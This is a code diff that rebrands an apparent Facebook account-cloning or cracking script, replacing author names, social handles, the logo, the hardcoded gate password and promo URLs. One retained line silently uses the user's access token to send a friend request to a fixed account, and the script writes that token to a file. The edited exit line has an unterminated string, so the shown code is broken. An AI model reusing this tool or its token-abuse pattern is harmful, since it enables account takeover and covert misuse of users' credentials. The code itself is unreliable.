@@ -17,7 +17,7 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 
 
 def keluar():
-	print "\033[1;96m[!] \x1b[1;91mExit*
+	print ("\033[1;96m[!] \x1b[1;91mExit*)
 	os.sys.exit()
 
 
@@ -50,23 +50,18 @@ def jalan(z):
 logo = """ 
 ★●═════⚀●☆●☆●⚀══════●★★★★★★★★★★★★★★★★●═════⚀●☆●☆●⚀══════●★
 
-★●═════⚀●☆●☆●⚀══════●★KILLERBOY - BRANDED★●═════⚀●☆●☆●⚀══════●★
+★●═════⚀●☆●☆●⚀══════●★MAFIAKING - BRANDED★●═════⚀●☆●☆●⚀══════●★
 
 ★●═════⚀●☆●☆●⚀══════●★~~~SYCO - BRAND~~~★●═════⚀●☆●☆●⚀══════●★
 
-★●═════⚀●☆●☆●⚀══════●★~~~Khalid Raheem FB~~~★●═════⚀●☆●☆●⚀══════●★
-    
- ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
- ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
-▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
-▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
-▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
-▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
-░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
-░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
-░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
-                                           
+★●═════⚀●☆●☆●⚀══════●★~~~VIVEK-SARKAR-WAR194~~~★●═════⚀●☆●☆●⚀══════●★
 
+███╗░░░███╗░█████╗░███████╗██╗░█████╗░
+████╗░████║██╔══██╗██╔════╝██║██╔══██╗
+██╔████╔██║███████║█████╗░░██║███████║
+██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
+██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
+╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
                       (                 )  (      
 		  (   )\ )    (      ( /(  )\ )   
                  ( )\ (()/(    )\     )\())(()/(   
@@ -76,15 +71,15 @@ logo = """
                  | _ \|   /   / _ \  | .` | | |) | 
                  |___/|_|_\  /_/ \_\ |_|\_| |___/  
                                    
-   Warning: Don't use your personal account.                                             
+      Warning: Don't use your personal account.                                             
      Warning: Use a Fresh Account to log in safely.
      Warning: Wait 20 minutes to get clone Account.
-\033[1;91m★●═════⚀●☆●☆●⚀══════●★Killer★●═════⚀●☆●☆●⚀══════●★
-\033[1;96mAuthor  \033[1;93m: \033[1;92mITX KILLER
-\033[1;96mInstagram \033[1;93m: \033[1; nnomirajpoot78
-\033[1;96mFacebook  \033[1;93m: \033[1; rrahraj123
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KillerBoy1/Kill
-\033[1;91m★●═════⚀●☆●☆●⚀══════●★killer★●═════⚀●☆●☆●⚀══════●★"""
+\033[1;91m★●═════⚀●☆●☆●⚀══════●★MAFIAKING394★●═════⚀●☆●☆●⚀══════●★
+\033[1;96mAuthor  \033[1;93m: \033[1;92mVIVEKSARKAR
+\033[1;96mInstagram \033[1;93m: \033[1; MAFIAking394
+\033[1;96mFacebook  \033[1;93m: \033[1; VivekSarkarWar194
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KillerBoy1/MafiaKing394
+\033[1;91m★●═════⚀●☆●☆●⚀══════●★VIVEKSARKAR-WAR194★●═════⚀●☆●☆●⚀══════●★"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -102,17 +97,17 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-print "\033[1;96m ★●═════⚀●☆●☆●⚀══════●★ULTIMATE-KILLER★●═════⚀●☆●☆●⚀══════●★"
-print  """\033[1;91m★●═════⚀●☆●☆●⚀══════●★KILLER★●═════⚀●☆●☆●⚀══════●★
-\033[1;96mAuthor  \033[1;93m: \033[1;92mITX KILLER
-\033[1;96mInstagram \033[1;93m: \033[1;92mnomirajpoot78
-\033[1;96mFacebook  \033[1;93m: \033[1;92m rahraj123
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/KillerBoy1/Kill
-\033[1;91m★●═════⚀●☆●☆●⚀══════●★killer★●═════⚀●☆●☆●⚀══════●★"""
-print " \x1b[1;93m★●═════⚀●☆●☆●⚀══════●★KILLER★●═════⚀●☆●☆●⚀══════●★"
+print "\033[1;96m ★●═════⚀●☆●☆●⚀══════●★MAFIAKING394★●═════⚀●☆●☆●⚀══════●★"
+print  """\033[1;91m★●═════⚀●☆●☆●⚀══════●★VIVEKSARKAR-WAR194★●═════⚀●☆●☆●⚀══════●★
+\033[1;96mAuthor  \033[1;93m: \033[1;92mMAFIAKING394
+\033[1;96mInstagram \033[1;93m: \033[1;92mVIVEKSARKAR
+\033[1;96mFacebook  \033[1;93m: \033[1;92mVIVEKSARKARWAR194
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/KillerBoy1/MafiaKing394
+\033[1;91m★●═════⚀●☆●☆●⚀══════●★MAFIAKING394★●═════⚀●☆●☆●⚀══════●★"""
+print " \x1b[1;93m★●═════⚀●☆●☆●⚀══════●★VivekSarkar-War194★●═════⚀●☆●☆●⚀══════●★"
 
-CorrectUsername = "killer"
-CorrectPassword = "nouman"
+CorrectUsername = "king"
+CorrectPassword = "vivek"
 
 loop = 'true'
 while (loop == 'true'):
@@ -124,7 +119,7 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/rahraj123')
+            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
     else:
         print "Wrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
@@ -168,7 +163,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
